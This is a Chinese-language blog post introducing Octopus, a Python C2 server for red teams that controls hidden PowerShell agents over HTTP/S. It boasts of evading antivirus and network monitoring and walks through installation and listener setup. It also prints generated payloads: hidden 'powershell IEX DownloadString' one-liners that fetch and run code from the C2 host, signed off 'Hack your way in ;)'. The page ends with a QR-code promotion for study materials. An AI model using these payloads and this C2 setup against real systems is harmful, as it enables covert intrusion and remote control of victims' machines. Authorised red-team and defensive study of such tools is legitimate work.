<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Octopus：专为红队设计的安全研究预操作C2服务器 - 编程中国的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Octopus：专为红队设计的安全研究预操作C2服务器" />
<meta property="og:description" content="关于Octopus Octopus是一款基于Python开发的开源工具，该工具可以通过HTTP/S控制Octopus Powershell代理。
Octopus的主要目的是帮助红队研究人员在对目标进行操作之前，先通过Octopus收集目标设备的信息，并对其执行渗透测试。
Octopus以一种非常简单的方式通过加密良好的通道执行命令并与C2交换信息，这种方式确保了几乎所有的AV、终端保护和网络监控方案都难以识别和探测到Octopus操作。
Octopus中有一个很酷的功能叫做ESA，它代表“端点态势感知”，它将收集有关目标的一些重要信息，帮助我们更好地了解在操作过程中将面对的目标网络端点，从而让我们能够根据这些信息定制实际操作方案。
Octopus的操作非常隐蔽，并且使用了AES-256作为PowerShell代理和C2服务器之间通信数据的加密算法。除此之外，我们还可以通过有效证书来配置Octopus
C2服务器使用SSL/TLS。
Octopus关键功能 Octopus提供了许多功能，可以帮助红队研究人员在开始任务之前更好地了解目标的相关信息：
1、通过HTTP/S控制代理；
2、执行系统命令；
3、下载/上传文件；
4、加载外部PowerShell模块；
5、C2和代理之间使用AES-256加密信道；
6、使用了隐蔽的方法来执行命令和传输数据；
7、支持为每个目标创建自定义的监听器；
8、生成不同类型的Payload；
9、生成2.0或更高版本的PowerShell，支持所有版本的Windows；
10、在不需要触发powershell.exe进程的情况下执行Octopus Windows代理可执行程序；
11、自动从所有端点自动收集信息；
工具要求 下列命令可以安装Octopus所需的所有依赖组件：
pip install -r requirements.txt 如果使用的是Linux系统，则需要安装nasm、mingw-w64和mono-devel：
apt install nasm apt install mingw-w64 apt install mono-devel 工具安装 首先，我们需要使用下列命令将该项目源码克隆至本地：
git clone https://github.com/mhaskar/Octopus/ 接下来，使用下列命令安装Octopus所需的所有依赖组件：
pip install -r requirements.txt 最后，使用下列命令开启并运行Octopus服务器：
./octopus.py 此时，我们将看到如下所示的信息：
工具使用 HTTP监听器 下列命令将运行一个名为operation1的监听器：
listen_http 0.0.0.0 8080 192.168.178.1 5 page.php operation1 上述命令将返回如下所示的结果：
Octopus &gt;&gt;listen_http 0.0.0.0 8080 192.168.178.1 5 page.php operation1 Octopus &gt;&gt; * Serving Flask app &#34;" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/20abab61cc3c571543816c23b6673b75/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-02-08T10:29:11+08:00" />
<meta property="article:modified_time" content="2023-02-08T10:29:11+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程中国的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程中国的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">Octopus：专为红队设计的安全研究预操作C2服务器</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-light">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <h3><a id="Octopus_0"></a>关于Octopus</h3> 
<p>Octopus是一款基于Python开发的开源工具，该工具可以通过HTTP/S控制Octopus Powershell代理。</p> 
<p>Octopus的主要目的是帮助红队研究人员在对目标进行操作之前，先通过Octopus收集目标设备的信息，并对其执行渗透测试。</p> 
<p>Octopus以一种非常简单的方式通过加密良好的通道执行命令并与C2交换信息，这种方式确保了几乎所有的AV、终端保护和网络监控方案都难以识别和探测到Octopus操作。</p> 
<p>Octopus中有一个很酷的功能叫做ESA，它代表“端点态势感知”，它将收集有关目标的一些重要信息，帮助我们更好地了解在操作过程中将面对的目标网络端点，从而让我们能够根据这些信息定制实际操作方案。</p> 
<p>Octopus的操作非常隐蔽，并且使用了AES-256作为PowerShell代理和C2服务器之间通信数据的加密算法。除此之外，我们还可以通过有效证书来配置Octopus<br> C2服务器使用SSL/TLS。</p> 
<h3><a id="Octopus_13"></a>Octopus关键功能</h3> 
<p>Octopus提供了许多功能，可以帮助红队研究人员在开始任务之前更好地了解目标的相关信息：</p> 
<blockquote> 
 <p>1、通过HTTP/S控制代理；</p> 
 <p>2、执行系统命令；</p> 
 <p>3、下载/上传文件；</p> 
 <p>4、加载外部PowerShell模块；</p> 
 <p>5、C2和代理之间使用AES-256加密信道；</p> 
 <p>6、使用了隐蔽的方法来执行命令和传输数据；</p> 
 <p>7、支持为每个目标创建自定义的监听器；</p> 
 <p>8、生成不同类型的Payload；</p> 
 <p>9、生成2.0或更高版本的PowerShell，支持所有版本的Windows；</p> 
 <p>10、在不需要触发powershell.exe进程的情况下执行Octopus Windows代理可执行程序；</p> 
 <p>11、自动从所有端点自动收集信息；</p> 
</blockquote> 
<h3><a id="_39"></a>工具要求</h3> 
<p>下列命令可以安装Octopus所需的所有依赖组件：</p> 
<pre><code>pip install -r requirements.txt
</code></pre> 
<p>如果使用的是Linux系统，则需要安装nasm、mingw-w64和mono-devel：</p> 
<pre><code>apt install nasm

apt install mingw-w64

apt install mono-devel
</code></pre> 
<h3><a id="_57"></a>工具安装</h3> 
<p>首先，我们需要使用下列命令将该项目源码克隆至本地：</p> 
<pre><code>git clone https://github.com/mhaskar/Octopus/
</code></pre> 
<p>接下来，使用下列命令安装Octopus所需的所有依赖组件：</p> 
<pre><code>pip install -r requirements.txt
</code></pre> 
<p>最后，使用下列命令开启并运行Octopus服务器：</p> 
<pre><code>./octopus.py
</code></pre> 
<p>此时，我们将看到如下所示的信息：</p> 
<p><img src="https://images2.imgbox.com/a6/89/YN1lNmno_o.jpg" alt=""></p> 
<h3><a id="_81"></a>工具使用</h3> 
<h4><a id="HTTP_83"></a>HTTP监听器</h4> 
<p>下列命令将运行一个名为operation1的监听器：</p> 
<pre><code>listen_http 0.0.0.0 8080 192.168.178.1 5 page.php operation1
</code></pre> 
<p>上述命令将返回如下所示的结果：</p> 
<pre><code>Octopus &gt;&gt;listen_http 0.0.0.0 8080 192.168.178.1 5 page.php operation1

Octopus &gt;&gt; * Serving Flask app "core.weblistener" (lazy loading)

 * Environment: production

   WARNING: Do not use the development server in a production environment.

   Use a production WSGI server instead.

 * Debug mode: off

 

Octopus &gt;&gt;
</code></pre> 
<h4><a id="HTTPS_111"></a>HTTPS监听器</h4> 
<pre><code>Octopus &gt;&gt;listen_https

[-] Please check listener arguments !

Syntax  : listen_https BindIP BindPort hostname interval URL listener_name certficate_path key_path

Example (with domain) : listen_https 0.0.0.0 443 myc2.live 5 login.php op1_listener certs/cert.pem certs/key.pem

Octopus &gt;&gt;listen_https 0.0.0.0 443 myc2.live 5 login.php darkside_operation certs/cert.pem certs/key.pem

SSL listener started !

[+]darkside_operation Listener has been created

Octopus &gt;&gt; * Serving Flask app "core.weblistener" (lazy loading)

 * Environment: production

   WARNING: Do not use the development server in a production environment.

   Use a production WSGI server instead.

 * Debug mode: off

 

Octopus &gt;&gt;
</code></pre> 
<h4><a id="PowerShell_143"></a>PowerShell代理生成</h4> 
<p>下列命令将针对operation1监听器生成一个代理：</p> 
<pre><code>generate_powershell operation1
</code></pre> 
<p>此时，我们将看到如下所示的结果：</p> 
<pre><code>Octopus &gt;&gt;generate_powershell operation1

#====================

1) powershell -w hidden "IEX (New-Object Net.WebClient).DownloadString('http://192.168.178.1:8080/page.php');"

 

2) powershell -w hidden "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://192.168.178.1:8080/page.php');"

 

3) powershell -w hidden "$w = (New-Object Net.WebClient).DownloadString('http://192.168.178.1:8080/page.php');Invoke-Expression $w;"

 

Note - For Windows 7 clients you may need to prefix the payload with "Add-Type -AssemblyName System.Core;"

       e.g. powershell -w hidden "Add-Type -AssemblyName System.Core;IEX (New-Object Net.WebClient).DownloadString('http://192.168.178.1:8080/page.php');"

 

Hack your way in ;)

#====================

 

Octopus &gt;&gt;
</code></pre> 
<h3><a id="_186"></a>最后</h3> 
<p>对于从来没有接触过网络安全的同学，我们帮你准备了详细的学习成长路线图。可以说是最科学最系统的学习路线，大家跟着这个大的方向学习准没问题。<br> <img src="https://images2.imgbox.com/0a/76/bMHrnFfH_o.png" alt=""><br> 同时每个成长路线对应的板块都有配套的视频提供：<br> <img src="https://images2.imgbox.com/ac/05/yWTWFuBH_o.png" alt=""><br> <img src="https://images2.imgbox.com/4d/6a/XxIDKJcJ_o.png" alt=""><br> 当然除了有配套的视频，同时也为大家整理了各种文档和书籍资料&amp;工具，并且已经帮大家分好类了。<br> <img src="https://images2.imgbox.com/10/79/DBRNX6sC_o.png" alt=""><br> <strong>因篇幅有限，仅展示部分资料，有需要的小伙伴，可以【扫下方二维码】免费领取：</strong><br> <img src="https://images2.imgbox.com/b1/f9/KAdzYGAs_o.png"></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/1c846ed7e97c0bbd1f8f89146d707cb8/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">有序链表的合并</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/73754e3160c194d4b62fc9042baae07b/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">Java学生信息管理系统</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程中国的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>